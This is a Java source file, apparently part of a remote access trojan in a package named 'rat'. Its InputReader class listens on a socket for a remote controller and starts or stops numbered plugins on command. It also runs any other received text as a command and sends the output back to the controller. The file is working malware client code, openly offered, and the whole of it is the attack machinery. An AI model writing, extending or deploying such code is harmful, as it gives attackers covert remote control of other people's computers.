package rat.network;

import rat.ClientMain;
import rat.plugins.AbstractPlugin;
import rat.plugins.command.CommandCallback;
import rat.plugins.command.CommandHandler;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;

public class InputReader implements Runnable
{
    private BufferedReader reader;
    private Socket clientSocket;
    private PrintWriter printWriter;

    public InputReader(Socket clientSocket) throws IOException
    {
        this.clientSocket = clientSocket;
        this.reader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
        this.printWriter = new PrintWriter(clientSocket.getOutputStream());
    }

    @Override
    public void run()
    {
        while (!clientSocket.isClosed())
        {
            try
            {
                String string;

                while ((string = reader.readLine()) != null)
                {
                    if (isInteger(string))
                    {
                        AbstractPlugin plugin = (AbstractPlugin) ClientMain.getPluginHandler().getPlugin(Byte.valueOf(string));

                        if (plugin.isRunning())
                        {
                            plugin.stop();
                            ClientMain.getPluginHandler().removeActivePlugin(Byte.valueOf(string));
                        }
                        else
                        {
                            plugin.clone().start();
                        }
                    }
                    else
                    {
                        System.out.println(string);

                        CommandHandler.callCommand(string, new CommandCallback()
                        {
                            @Override
                            public void onCallback(String string)
                            {
                                printWriter.println(string);
                            }
                        });
                    }
                }
            }
            catch (IOException e)
            {
                e.printStackTrace();
            }
        }
    }


    public static boolean isInteger(String s)
    {
        return isInteger(s, 10);
    }

    public static boolean isInteger(String s, int radix)
    {
        if (s.isEmpty())
        {
            return false;
        }
        for (int i = 0; i < s.length(); i++)
        {
            if (i == 0 && s.charAt(i) == '-')
            {
                if (s.length() == 1)
                {
                    return false;
                }
                else
                {
                    continue;
                }
            }
            if (Character.digit(s.charAt(i), radix) < 0)
            {
                return false;
            }
        }
        return true;
    }
}
